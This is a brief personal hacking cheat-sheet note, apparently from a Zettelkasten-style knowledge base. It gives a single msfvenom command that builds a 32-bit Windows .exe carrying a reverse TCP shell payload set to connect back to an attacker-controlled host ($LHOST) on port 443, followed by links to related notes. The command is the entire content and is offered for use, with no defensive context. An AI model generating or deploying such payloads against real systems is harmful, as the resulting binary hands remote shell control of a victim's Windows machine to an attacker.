# MSFVENOM Windows Binary (.exe) executable 32 Bit (x86) Reverse Shell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe
```

# References
- [20221003150775](/zet/20221003150775/README.md) MSFVENOM Windows Binary (.exe) executable 32 Bit (x86)
- ~/kb/hacking/commands/msfvenom-commands.md

Tags:
    #assorted
